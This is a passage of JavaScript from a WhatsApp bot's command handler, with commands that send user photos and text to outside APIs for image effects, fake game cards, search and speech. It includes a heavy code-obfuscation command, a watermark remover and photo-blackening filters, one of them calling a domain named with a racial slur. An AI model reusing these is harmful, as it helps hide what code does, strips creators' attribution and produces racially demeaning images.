              fs.mkdirSync(tmpDir, {
                recursive: true
              });
            }
            const {
              default: path
            } = await import('path');
            tmpPath = path.join(tmpDir, `sanhua_hd_${Date.now()}.jpg`);
            fs.writeFileSync(tmpPath, buffer);
            const result = await imgupscale.upscale(tmpPath, Number(scale));
            if (!result.success || !result.downloadUrls?.length) {
              throw new Error("failed to upscale the image.");
            }
            await client.sendMessage(m.chat, {
              image: {
                url: result.downloadUrls[0]
              },
              caption: `✅ the image was successfully enhanced become ${scale}x`
            }, {
              quoted: m
            });
          } catch (e) {
            xreply(`an error occurred: ${e.message}`);
          } finally {
            const fs = require('fs');
            if (tmpPath && fs.existsSync(tmpPath)) {
              fs.unlinkSync(tmpPath);
            }
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
      case 'fakeffduo':
        {
          try {
            const axios = require('axios');
            if (!text) {
              return xreply(`❌ *the nickname must not be empty*

Format:
.fakeffduo nickname1|nickname2`);
            }
            const args = text.split('|');
            if (args.length < 2) {
              return xreply(`❌ *wrong format*

use:
.fakeffduo nickname1|nickname2
`);
            }
            const nickname1 = args[0].trim();
            const nickname2 = args.slice(1).join('|').trim();
            if (!nickname1 || !nickname2) {
              return xreply("❌ both nicknames are required.");
            }
            if (nickname1.length > 30 || nickname2.length > 30) {
              return xreply("❌ maximum 30 characters per nickname.");
            }
            await xreply("⏳ creating the Fake FF Duo...");
            const apiUrl = `https://apii.nexadev.my.id/fakeffduo?nickname1=${encodeURIComponent(nickname1)}&nickname2=${encodeURIComponent(nickname2)}`;
            const response = await axios.get(apiUrl, {
              responseType: 'arraybuffer',
              timeout: 60000,
              headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
              },
              maxContentLength: 15 * 1024 * 1024,
              maxBodyLength: 15 * 1024 * 1024
            });
            if (!response.data || response.data.length === 0) {
              return xreply("❌ the API did not return an image.");
            }
            const contentType = response.headers['content-type'] || '';
            if (!contentType.startsWith('image/')) {
              let errorText;
              try {
                errorText = Buffer.from(response.data).toString('utf8');
              } catch {
                errorText = "the API response is not an image.";
              }
              return xreply(`❌ *FAILED TO CREATE THE FAKE FF DUO CARD*

${errorText.substring(0, 1000)}`);
            }
            await client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: `🎮 *FAKE FREE FIRE DUO*`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log('FAKEFFDUO ERROR:', e);
            let errorMessage = e.response?.data?.message || e.response?.data?.msg || e.message || "an unknown error occurred.";
            if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') {
              errorMessage = "API request timed out. Please try again.";
            }
            if (e.response?.status === 404) {
              errorMessage = "Fake FF Duo endpoint not found (404) (404).";
            }
            if (e.response?.status === 429) {
              errorMessage = "too many requests. Wait a moment.";
            }
            return xreply(`❌ *FAKE FF DUO ERROR*

${errorMessage}`);
          }
        }
        break;
      case 'fakeff':
        {
          try {
            const axios = require('axios');
            if (!text) {
              return xreply(`❌ *the name must not be empty*

example:
.fakeff Akoya-MD`);
            }
            const username = text.trim();
            if (username.length > 30) {
              return xreply("❌ name is too long! 30 characters maximum.");
            }
            await xreply("⏳ creating the Fake FF...");
            const apiUrl = `https://apii.nexadev.my.id/fakeff?usn=${encodeURIComponent(username)}`;
            const response = await axios.get(apiUrl, {
              responseType: 'arraybuffer',
              timeout: 60000,
              headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
              },
              maxContentLength: 15 * 1024 * 1024,
              maxBodyLength: 15 * 1024 * 1024
            });
            if (!response.data || response.data.length === 0) {
              return xreply("❌ the API did not return an image.");
            }
            const contentType = response.headers['content-type'] || '';
            if (!contentType.startsWith('image/')) {
              let errorText;
              try {
                errorText = Buffer.from(response.data).toString('utf8');
              } catch {
                errorText = "the API response is not an image.";
              }
              return xreply(`❌ *FAILED TO CREATE THE FAKE FF CARD*

${errorText.substring(0, 1000)}`);
            }
            await client.sendMessage(m.chat, {
              image: Buffer.from(response.data),
              caption: `
🎮 *FAKE FREE FIRE*

👤 Username:
${username}

✅ Fake FF successfully created.
`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log('FAKEFF ERROR:', e);
            let errorMessage = e.response?.data?.message || e.response?.data?.msg || e.message || "an unknown error occurred.";
            if (e.code === 'ECONNABORTED' || e.code === 'ETIMEDOUT') {
              errorMessage = "API request timed out. Please try again.";
            }
            if (e.response?.status === 404) {
              errorMessage = "Fake FF endpoint not found (404) (404).";
            }
            if (e.response?.status === 429) {
              errorMessage = "too many requests. Wait a moment.";
            }
            return xreply(`❌ *FAKE FF ERROR*

${errorMessage}`);
          }
        }
        break;

      /// ───────────── [ 𝖲𝖼𝗋𝗂𝗉𝗍 & 𝖮𝖻𝖿𝗎𝗌𝖼𝖺𝗍𝗈𝗋 ] ──────────── ///
      case "sc":
      case "getsc":
      case "script":
        {
          const foto = fs.readFileSync("./media/thum.jpg");
          const sc = "";
          const anu = `
hi *${m.pushName}*, here is what you should know about Akoya-MD.

\`house rules\`
- keep the credits if you share this build
- it is free and open source, so reselling it is not allowed
- do not claim this build as your own work
- do not strip, change or hide the credits
- if you recode or redistribute it, *the original credits stay in place*`.trim();
          try {
            const media = await prepareWAMessageMedia({
              image: foto
            }, {
              upload: client.waUploadToServer
            });
            const interactiveMsg = {
              body: {
                text: sc
              },
              footer: {
                text: anu
              },
              header: {
                hasMediaAttachment: true,
                imageMessage: media.imageMessage
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𝖢𝗈𝗇𝗍𝖺𝖼𝗍 𝖮𝗐𝗇𝖾𝗋",
                    url: "https://wa.me/233533416608",
                    merchant_url: "https://www.google.com"
                  })
                }],
                messageParamsJson: "{}"
              }
            };
            const generatedMsg = generateWAMessageFromContent(m.chat, {
              viewOnceMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                  },
                  interactiveMessage: interactiveMsg
                }
              }
            }, {
              userJid: m.chat,
              upload: client.waUploadToServer
            });
            return await client.relayMessage(m.chat, generatedMsg.message, {
              messageId: generatedMsg.key.id
            });
          } catch (e) {
            console.log(e);
            reply(`❌ failed to send the message: ${e.message}`);
          }
        }
        break;
      case 'enc':
        {
          if (!isOwner) return reply("❌ premium-user-only feature");
          if (!m.quoted) return xreply("\n❌ ғᴏʀᴍᴀᴛ ʜᴀʀᴜs ғɪʟᴇ.ᴊs\n");
          if (!text || !text.includes('|')) return reply("\n❌ example:\n.enc text1|text2\n.enc Akoya-MD|Akoya-enc\n");
          try {
            Reply('⚡ Processing hard code encryption...');
            const fs = require('fs');
            const path = require('path');
            const axios = require('axios');
            const JsConfuser = require('js-confuser');
            let [text1, text2] = text.split('|');
            let media = await m.quoted.download();
            if (!media) return reply("❌ failed to download the file");
            const fileName = m.quoted?.message?.documentMessage?.fileName || m.quoted?.message?.imageMessage?.fileName || m.quoted?.message?.videoMessage?.fileName || null;
            let codeString = media.toString('utf-8');
            if (typeof codeString !== 'string') throw new Error("the file is not a JavaScript string");
            let obfuscated = await JsConfuser.obfuscate(codeString, {
              target: "node",
              compact: true,
              controlFlowFlattening: 0.8,
              deadCode: 0.3,
              dispatcher: true,
              duplicateLiteralsRemoval: 0.7,
              globalConcealing: true,
              minify: true,
              movedDeclarations: true,
              objectExtraction: true,
              renameVariables: true,
              renameGlobals: true,
              stringEncoding: true,
              stringSplitting: 0.5,
              stringConcealing: true,
              stringCompression: true,
              opaquePredicates: 0.9,
              calculator: true,
              hexadecimalNumbers: true,
              shuffle: true,
              identifierGenerator: () => `高宝座${text1}齐${text2}高宝座` + Math.random().toString(36).substring(7)
            });
            let result = typeof obfuscated === 'object' ? obfuscated.code : obfuscated;
            if (typeof result !== 'string') throw new Error("invalid encryption result");
            let outFile = path.join(__dirname, `encrypted_${m.quoted.fileName}`);
            fs.writeFileSync(outFile, result);
            await client.sendMessage(m.chat, {
              document: fs.readFileSync(outFile),
              fileName: `${fileName}_${m.pushName}.js`,
              mimetype: 'application/javascript',
              caption: '✅ Encryption Successful\n• Type: Hard Code'
            }, {
              quoted: m
            });
            fs.unlinkSync(outFile);
          } catch (e) {
            console.error(e);
            Reply('❌ Error: ' + e.message);
          }
        }
        break;

      /// ───────────── [ 𝖣𝖾𝗐𝖺𝗍𝖾𝗋𝗆𝖺𝗋𝗄 & 𝖨𝗆𝖺𝗀𝖾 𝖬𝖺𝗇𝗂𝗉𝗎𝗅𝖺𝗌𝗂 ] ──────────── ///
      case "delwatermark":
        {
          if (!m.quoted) {
            return xreply("❌ reply to the photo you want to process.");
          }
          const mime = (m.quoted.msg || m.quoted).mimetype || "";
          if (!/^image\//i.test(mime)) {
            return xreply("❌ reply to a photo, not a video or document.");
          }
          let media = null;
          try {
            const fs = require("fs");
            const axios = require("axios");
            const {
              ImageUploadService
            } = require("node-upload-images");
            await xreply("⏳ *DEWATERMARK*\n\n" + "📥 fetching the photo...");
            media = await client.downloadAndSaveMediaMessage(m.quoted);
            if (!media || !fs.existsSync(media)) {
              throw new Error("failed to download the photo.");
            }
            await xreply("🌐 Upload photo to Pixhost...");
            const service = new ImageUploadService("pixhost.to");
            const upload = await service.uploadFromBinary(fs.readFileSync(media), "Akoya-md.jpg");
            if (!upload || !upload.directLink) {
              throw new Error("failed to get the direct Pixhost link.");
            }
            const imageUrl = upload.directLink.toString();
            console.log("[DEWATERMARK URL]", imageUrl);
            try {
              fs.unlinkSync(media);
              media = null;
            } catch {}
            await xreply("🧹 Deleting watermark...\n" + "⏳ one moment...");
            const apiUrl = "https://api.nexray.eu.cc/tools/v1/dewatermark?url=" + encodeURIComponent(imageUrl);
            const response = await axios.get(apiUrl, {
              responseType: "arraybuffer",
              timeout: 180000,
              headers: {
                "User-Agent": "Mozilla/5.0"
              }
            });
            const resultBuffer = Buffer.from(response.data);
            if (!resultBuffer || resultBuffer.length < 100) {
              throw new Error("the API result is empty or corrupted.");
            }
            console.log("[DEWATERMARK]", "Content-Type:", response.headers["content-type"]);
            console.log("[DEWATERMARK]", "Size:", resultBuffer.length, "bytes");
            const isPNG = resultBuffer.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]));
            if (!isPNG) {
              const textResponse = resultBuffer.toString("utf8");
              console.log("[DEWATERMARK NON-PNG]", textResponse.slice(0, 2000));
              throw new Error("the API did not return a PNG image.");
            }
            await client.sendMessage(m.chat, {
              image: resultBuffer,
              mimetype: "image/png",
              caption: "✅ *DEWATERMARK success*\n\n" + "🧹 watermark already processed."
            }, {
              quoted: m
            });
            console.log("[DEWATERMARK] successfully sent the result.");
          } catch (e) {
            console.error("[DEWATERMARK ERROR]", e);
            return xreply("❌ *DEWATERMARK failed*\n\n" + "Error: " + (e?.response?.data ? Buffer.isBuffer(e.response.data) ? e.response.data.toString("utf8").slice(0, 500) : JSON.stringify(e.response.data).slice(0, 500) : e?.message || e));
          } finally {
            if (media && fs.existsSync(media)) {
              try {
                fs.unlinkSync(media);
              } catch {}
            }
          }
        }
        break;
      case 'removebg':
      case 'rvbg':
      case 'rmbg':
      case 'removebackground':
        {
          try {
            if (!/image/.test(mime)) {
              return xreply(example("by sending/replying with a photo"));
            }
            Reply("⏳ uploading the image to Pixhost...");
            const {
              ImageUploadService
            } = require("node-upload-images");
            const fs = require("fs");
            const axios = require("axios");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const service = new ImageUploadService("pixhost.to");
            const {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), `removebg_${Date.now()}.jpg`);
            fs.unlinkSync(media);
            if (!directLink) {
              return xreply("❌ failed to upload the image to Pixhost.");
            }
            Reply("⏳ removing the background...");
            const api = `https://api.nexray.eu.cc/tools/removebg?url=${encodeURIComponent(directLink)}`;
            const {
              data
            } = await axios.get(api, {
              responseType: "arraybuffer",
              timeout: 120000,
              headers: {
                Accept: "image/*"
              }
            });
            await client.sendMessage(m.chat, {
              image: Buffer.from(data),
              caption: `乂 *remove background success*
> the background was successfully removed.`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            if (e.response) {
              console.log("Status:", e.response.status);
              console.log("Data:", e.response.data?.toString?.());
            }
            xreply(`❌ failed to remove the background!

${e.message}`);
          }
        }
        break;
      case 'blurface':
        {
          try {
            if (!/image/.test(mime)) {
              return xreply(example("by sending/replying with a photo"));
            }
            Reply("⏳ uploading the image to Pixhost...");
            const {
              ImageUploadService
            } = require("node-upload-images");
            const fs = require("fs");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const service = new ImageUploadService("pixhost.to");
            const {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), `blurface_${Date.now()}.jpg`);
            fs.unlinkSync(media);
            if (!directLink) {
              return xreply("❌ failed to upload to Pixhost.");
            }
            Reply("⏳ processing the blur face...");
            const api = `https://api.nexray.eu.cc/tools/blurface?url=${encodeURIComponent(directLink)}`;
            await client.sendMessage(m.chat, {
              image: {
                url: api
              },
              caption: `
乂 *BLUR FACE SUCCESS*
> successfully created the blur face effect.`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`❌ failed to create the blur face!

${e.message}`);
          }
        }
        break;
      case "hitamin":
        {
          if (!/image/.test(mime)) return xreply("reply to the image you want blacked with the caption *hitamin*");
          const mediaPath = await client.downloadAndSaveMediaMessage(qmsg);
          const buffer = fs.readFileSync(mediaPath);
          const base64Image = buffer.toString("base64");
          try {
            const axios = require('axios');
            const response = await axios({
              url: "https://negro.consulting/api/process-image",
              method: "POST",
              data: {
                filter: "black",
                imageData: "data:image/png;base64," + base64Image
              }
            });
            const resultBuffer = Buffer.from(response.data.processedImageUrl.replace("data:image/png;base64,", ""), "base64");
            await client.sendMessage(m.chat, {
              image: resultBuffer,
              caption: `Selesai, pake filter *hitam*`
            }, {
              quoted: m
            });
            fs.unlinkSync(mediaPath);
          } catch (err) {
            console.log(err);
            xreply("failed to process the image.");
          }
        }
        break;
      case "hd":
      case "enhance":
        {
          try {
            if (!/image/.test(mime)) {
              return xreply(`⚠️ *Format usage:*

💬 example:
Reply/Send image with caption
${prefix + command}`);
            }
            await client.sendMessage(m.chat, {
              react: {
                text: "🖼️",
                key: m.key
              }
            });
            const quoted = m.quoted ? m.quoted : m;
            const buffer = await quoted.download();
            const FormData = require("form-data");
            const axios = require("axios");
            const form = new FormData();
            form.append("method", "1");
            form.append("is_pro_version", "false");
            form.append("is_enhancing_more", "false");
            form.append("max_image_size", "high");
            form.append("file", buffer, {
              filename: "image.jpg",
              contentType: "image/jpeg"
            });
            const response = await axios.post("https://ihancer.com/api/enhance", form, {
              headers: form.getHeaders(),
              responseType: "arraybuffer"
            });
            const result = Buffer.from(response.data);
            await client.sendMessage(m.chat, {
              image: result,
              caption: `*HD Image Success* ✅

🖼️ image success in enhance become HD
> *Powered By Akoya-MD*`
            }, {
              quoted: m
            });
            await client.sendMessage(m.chat, {
              react: {
                text: "✅",
                key: m.key
              }
            });
          } catch (err) {
            console.error("HD Error:", err?.response?.data || err.message);
            await client.sendMessage(m.chat, {
              text: `⚠️ sorry , an error occurred during meng-HD-kan image.

💡 Detail Error:
${err?.response?.data?.message || err.message}`
            }, {
              quoted: m
            });
            await client.sendMessage(m.chat, {
              react: {
                text: "❌",
                key: m.key
              }
            });
          }
        }
        break;
      case "tohitam":
        {
          try {
            const fs = require("fs");
            const axios = require("axios");
            const {
              ImageUploadService
            } = require("node-upload-images");
            if (!/image/.test(mime)) return xreply(`reply to a photo with the caption *${prefix + command}*`);
            await xreply("⏳ uploading the image...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "Akoya-md.jpg");
            fs.unlinkSync(media);
            await xreply("🎨 converting image...");
            const response = await axios({
              method: "GET",
              url: `https://api.nexray.eu.cc/ephoto/hitam?url=${encodeURIComponent(directLink)}`,
              responseType: "arraybuffer",
              validateStatus: () => true
            });
            const type = response.headers["content-type"] || "";
            if (type.startsWith("image/")) {
              return await client.sendMessage(m.chat, {
                image: Buffer.from(response.data),
                caption: "✅ successfully converted the image to black."
              }, {
                quoted: m
              });
            }
            const json = JSON.parse(Buffer.from(response.data).toString());
            if (!json.status) {
              return xreply(`❌ ${json.error || "failed to process the image."}`);
            }
            let result = json.result || json.result_url || json.url || json.image || json.data?.url;
            if (!result) {
              return xreply("❌ result URL not found.");
            }
            await client.sendMessage(m.chat, {
              image: {
                url: result
              },
              caption: "✅ successfully converted the image to black."
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`❌ Error\n${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖤𝖿𝖾𝗄 𝖨𝗆𝖺𝗀𝖾 & 𝖲𝗍𝗂𝖼𝗄𝖾𝗋 ] ──────────── ///
      case "tocomic":
        {
          try {
            if (!/image/.test(mime)) return xreply("reply to a photo with command *.tocomic*");
            await xreply("⏳ converting image become Comic...");
            const axios = require("axios");
            const FormData = require("form-data");
            const fs = require("fs");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            let form = new FormData();
            form.append("file", fs.createReadStream(media));
            let {
              data
            } = await axios.post("https://api-nexaku.my.id/transform/comic", form, {
              headers: {
                ...form.getHeaders()
              },
              responseType: "arraybuffer",
              maxBodyLength: Infinity,
              maxContentLength: Infinity
            });
            if (fs.existsSync(media)) fs.unlinkSync(media);
            await client.sendMessage(m.chat, {
              image: Buffer.from(data),
              caption: `📖 *Comic AI*

✅ image success changed become style Comic.`
            }, {
              quoted: m
            });
          } catch (e) {
            if (typeof media !== "undefined" && fs.existsSync(media)) fs.unlinkSync(media);
            console.log(e.response?.data || e);
            xreply(`❌ failed to process the image

${e.response?.status || ""}
${e.message}`);
          }
        }
        break;
      case "tochibi":
        {
          try {
            const fs = require("fs");
            const axios = require("axios");
            const {
              ImageUploadService
            } = require("node-upload-images");
            if (!/image/.test(mime)) return xreply(`reply to a photo with the caption *${prefix + command}*`);
            await xreply("⏳ uploading the image...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "Akoya-md.jpg");
            fs.unlinkSync(media);
            await xreply("🎨 generating the image Chibi...");
            const response = await axios({
              method: "GET",
              url: `https://api.nexray.eu.cc/ephoto/chibi?url=${encodeURIComponent(directLink)}`,
              responseType: "arraybuffer",
              validateStatus: () => true
            });
            const type = response.headers["content-type"] || "";
            if (type.startsWith("image/")) {
              return await client.sendMessage(m.chat, {
                image: Buffer.from(response.data),
                caption: "✅ successfully converted the image to Chibi."
              }, {
                quoted: m
              });
            }
            let json = {};
            try {
              json = JSON.parse(Buffer.from(response.data).toString());
            } catch {}
            if (!json.status) {
              return xreply(`❌ ${json.error || "failed to process the image."}`);
            }
            let hasil = json.result || json.result_url || json.url || json.image || json.output || json.data?.url || json.data?.result;
            if (!hasil) {
              return xreply("❌ result URL not found.");
            }
            await client.sendMessage(m.chat, {
              image: {
                url: hasil
              },
              caption: "✅ successfully converted the image to Chibi."
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e.response?.data || e);
            xreply(`❌ Error\n${e.message}`);
          }
        }
        break;
      case "toghibli":
        {
          try {
            if (!/image/.test(mime)) {
              return reply(`example:
${prefix + command} reply photo`);
            }
            Reply("⏳ Upload image to PixHost...");
            const fs = require("fs");
            const axios = require("axios");
            const {
              ImageUploadService
            } = require("node-upload-images");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "Akoya-md.jpg");
            fs.unlinkSync(media);
            Reply("🎨 generating the image Ghibli...");
            const api = `https://api.nexray.eu.cc/ephoto/ghibli?url=${encodeURIComponent(directLink)}`;
            const {
              data
            } = await axios.get(api, {
              responseType: "arraybuffer"
            });
            await client.sendMessage(m.chat, {
              image: Buffer.from(data),
              caption: `*🌸 TO GHIBLI SUCCESS*\n\n🔗 Source : ${directLink}`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            Reply("❌ failed to create image Ghibli.\n\n" + e.message);
          }
        }
        break;
      case "cine":
        {
          try {
            const fs = require("fs");
            const axios = require("axios");
            const {
              ImageUploadService
            } = require("node-upload-images");
            if (!/image/.test(mime)) return xreply(`reply to a photo with the caption *${prefix + command}*`);
            await xreply("⏳ uploading the image to Pixhost...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "Akoya-md.jpg");
            fs.unlinkSync(media);
            await xreply("🎬 creating efek Cinematic...");
            const response = await axios({
              method: "GET",
              url: `https://api.nexray.eu.cc/ephoto/cinematic?url=${encodeURIComponent(directLink)}`,
              responseType: "arraybuffer",
              validateStatus: () => true
            });
            const contentType = response.headers["content-type"] || "";
            if (contentType.startsWith("image/")) {
              return await client.sendMessage(m.chat, {
                image: Buffer.from(response.data),
                caption: "✅ successfully created a cinematic effect."
              }, {
                quoted: m
              });
            }
            let json = {};
            try {
              json = JSON.parse(Buffer.from(response.data).toString());
            } catch {}
            if (!json.status) {
              return xreply(`❌ ${json.error || json.message || "failed to process the image."}`);
            }
            let hasil = json.result || json.result_url || json.url || json.image || json.output || json.data?.url || json.data?.result;
            if (!hasil) {
              return xreply("❌ result URL not found.");
            }
            await client.sendMessage(m.chat, {
              image: {
                url: hasil
              },
              caption: "✅ successfully created a cinematic effect."
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e.response?.data || e);
            xreply(`❌ Error\n${e.response?.data?.error || e.response?.data?.message || e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖥𝗂𝗀𝗎𝗋𝖾 𝖬𝖺𝗄𝖾𝗋 ] ──────────── ///
      case "figure2":
        {
          try {
            const fs = require("fs");
            const axios = require("axios");
            const {
              ImageUploadService
            } = require("node-upload-images");
            if (!/image/.test(mime)) return xreply(`reply to a photo with the caption *${prefix + command}*`);
            await xreply("⏳ uploading the image...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "Akoya-md.jpg");
            fs.unlinkSync(media);
            await xreply("🎨 creating Figure V2...");
            const response = await axios({
              method: "GET",
              url: `https://api.nexray.eu.cc/ephoto/v2/figure?url=${encodeURIComponent(directLink)}`,
              responseType: "arraybuffer",
              validateStatus: () => true
            });
            const contentType = response.headers["content-type"] || "";
            if (contentType.startsWith("image/")) {
              return await client.sendMessage(m.chat, {
                image: Buffer.from(response.data),
                caption: "✅ successfully created the figure V2."
              }, {
                quoted: m
              });
            }
            let json = {};
            try {
              json = JSON.parse(Buffer.from(response.data).toString());
            } catch {}
            if (!json.status) {
              return xreply(`❌ ${json.error || "failed to process the image."}`);
            }
            let hasil = json.result || json.result_url || json.url || json.image || json.output || json.data?.url || json.data?.result;
            if (!hasil) {
              return xreply("❌ result URL not found.");
            }
            await client.sendMessage(m.chat, {
              image: {
                url: hasil
              },
              caption: "✅ successfully created the figure V2."
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e.response?.data || e);
            xreply(`❌ Error\n${e.message}`);
          }
        }
        break;
      case "figure":
        {
          try {
            const fs = require("fs");
            const axios = require("axios");
            const {
              ImageUploadService
            } = require("node-upload-images");
            if (!/image/.test(mime)) return xreply(`reply to a photo with the caption *${prefix + command}*`);
            await xreply("⏳ uploading the image...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const service = new ImageUploadService("pixhost.to");
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), "Akoya-md.jpg");
            fs.unlinkSync(media);
            await xreply("🎨 creating Figure...");
            const response = await axios({
              method: "GET",
              url: `https://api.nexray.eu.cc/ephoto/v1/figure?url=${encodeURIComponent(directLink)}`,
              responseType: "arraybuffer",
              validateStatus: () => true
            });
            const contentType = response.headers["content-type"] || "";
            if (contentType.startsWith("image/")) {
              return await client.sendMessage(m.chat, {
                image: Buffer.from(response.data),
                caption: "✅ successfully created the figure."
              }, {
                quoted: m
              });
            }
            let json = {};
            try {
              json = JSON.parse(Buffer.from(response.data).toString());
            } catch {}
            if (!json.status) {
              return xreply(`❌ ${json.error || "failed to process the image."}`);
            }
            let hasil = json.result || json.result_url || json.url || json.image || json.output || json.data?.url || json.data?.result;
            if (!hasil) {
              return xreply("❌ result URL not found.");
            }
            await client.sendMessage(m.chat, {
              image: {
                url: hasil
              },
              caption: "✅ successfully created the figure."
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e.response?.data || e);
            xreply(`❌ Error\n${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖶𝗂𝗇𝗄 𝖠𝖨 ] ──────────── ///
      case "wink":
        {
          try {
            if (!text) {
              return xreply(`example:

.wink hd

reply to a photo then type mode.

Mode:
• hd`);
            }
            if (!/image/.test(mime)) {
              return xreply("reply to a photo with the caption.wink hd");
            }
            await xreply("⏳ uploading the image...");
            let media = await client.downloadAndSaveMediaMessage(qmsg);
            const {
              ImageUploadService
            } = require('node-upload-images');
            const service = new ImageUploadService('pixhost.to');
            let {
              directLink
            } = await service.uploadFromBinary(fs.readFileSync(media), 'rafaofficial.png');
            fs.unlinkSync(media);
            await xreply("🎨 processing with Wink AI...");
            const axios = require("axios");
            let api = `https://api.azbry.com/api/tools/wink?url=${encodeURIComponent(directLink)}&mode=${encodeURIComponent(text.trim())}`;
            let {
              data
            } = await axios.get(api);
            if (!data.status) {
              return xreply("❌ failed to process the image");
            }
            let hasil = data.result.result_url;
            await client.sendMessage(m.chat, {
              image: {
                url: hasil
              },
              caption: `✨ *Wink AI Editor*

📌 Mode : ${data.result.mode}
🖼️ Input: reply to a photo

✅ success processed`
            }, {
              quoted: m
            });
          } catch (e) {
            console.log(e);
            xreply(`❌ Error:\n${e.message}`);
          }
        }
        break;

      /// ───────────── [ 𝖳𝗂𝗄𝖳𝗈𝗄 𝖯𝗁𝗈𝗍𝗈 ] ──────────── ///
      case "ttphoto":
        {
          if (!text) {
            return xreply("❌ enter a search keyword.\n\n" + `example:
${prefix}tiktokphoto anime kece`);
          }
          try {
            const axios = require("axios");
            await xreply("🔎 searching for the TikTok photo...");
            const apiUrl = "https://api.nexray.eu.cc/search/tiktokphoto?q=" + encodeURIComponent(text);
            const response = await axios.get(apiUrl, {
              timeout: 60000
            });
            const data = response.data;
            console.log("[TIKTOKPHOTO RESPONSE]", data);
            if (!data) {
              return xreply("❌ the API returned no response.");
            }
            const results = Array.isArray(data?.result) ? data.result : Array.isArray(data?.results) ? data.results : Array.isArray(data?.data) ? data.data : Array.isArray(data?.data?.result) ? data.data.result : Array.isArray(data?.data?.results) ? data.data.results : [];
            if (!results.length) {
              return xreply("❌ photo not found for search:\n" + `"${text}"`);
            }
            const imageUrls = results.map(item => {
              if (typeof item === "string") return item;
              return item?.url || item?.image || item?.imageUrl || item?.photo || item?.download || item?.downloadUrl || item?.cover;
            }).filter(url => typeof url === "string" && /^https?:\/\//i.test(url));
            if (!imageUrls.length) {
              return xreply("❌ Result API found, but URL the photo not found.\n\n" + "Response API:\n" + JSON.stringify(data, null, 2).slice(0, 4000));
            }
            const photos = imageUrls.slice(0, 10);
            await xreply(`✅ Found ${imageUrls.length} photo.\n` + `📸 sending ${photos.length} result first...`);
            for (let i = 0; i < photos.length; i++) {
              try {
                await client.sendMessage(m.chat, {
                  image: {
                    url: photos[i]
                  },
                  caption: `📸 *TIKTOK PHOTO*\n\n` + `🔎 Query: ${text}\n` + `📌 Result: ${i + 1}/${photos.length}`
                }, {
                  quoted: m
                });
              } catch (err) {
                console.error(`[TIKTOKPHOTO IMAGE ${i + 1}]`, err);
              }
            }
          } catch (e) {
            console.error("[TIKTOKPHOTO ERROR]", e);
            return xreply("❌ failed to search TikTok Photo.\n\n" + "Error: " + (e?.response?.data?.message || e?.response?.data?.error || e?.message || e));
          }
        }
        break;

      /// ───────────── [ 𝖦𝖾𝗆𝗂𝗇𝗂 𝖳𝖳𝖲 ] ──────────── ///
      case "geminitts":
        {
          if (!text) {
            return xreply("❌ Enter text ingin changed become suara.\n\n" + `example:
${prefix}geminitts hello how are you`);
          }
          try {
            const axios = require("axios");
            await xreply("⏳ creating suara...");
            const apiUrl = "https://api.nexray.eu.cc/ai/gemini-tts?text=" + encodeURIComponent(text);
            const response = await axios.get(apiUrl, {
              timeout: 120000
            });
            const data = response.data;
            if (!data?.status || !data?.result) {
              console.log("[GEMINI TTS RESPONSE]", data);
              return xreply("❌ the API did not return valid audio.");
            }
            const audioUrl = data.result;
            await client.sendMessage(m.chat, {
              audio: {
                url: audioUrl
              },
              mimetype: "audio/mpeg",
              ptt: false
            }, {
              quoted: m
            });
          } catch (e) {
            console.error("[GEMINI TTS ERROR]", e);
            return xreply("❌ failed to create suara.\n\n" + "Error: " + (e?.response?.data?.message || e?.response?.data?.error || e?.message || e));
          }
        }
        break;

      /// ───────────── [ 𝖥𝖺𝗄𝖾 𝖭𝗈𝗄𝗂𝖺 ] ──────────── ///
      case 'pakeko':
        {
          try {
            if (!text) {
              return xreply(`example:
.fakenokia i fell in love, there is a reason, not just a friend`);
            }
            const {
              createCanvas,
              loadImage
            } = require('canvas');
            const fs = require('fs');
            const path = require('path');
            const https = require('https');
            const http = require('http');
            const BG_URL = 'https://img3.pixhost.to/images/5090/760870690_rafaofficial.jpg';
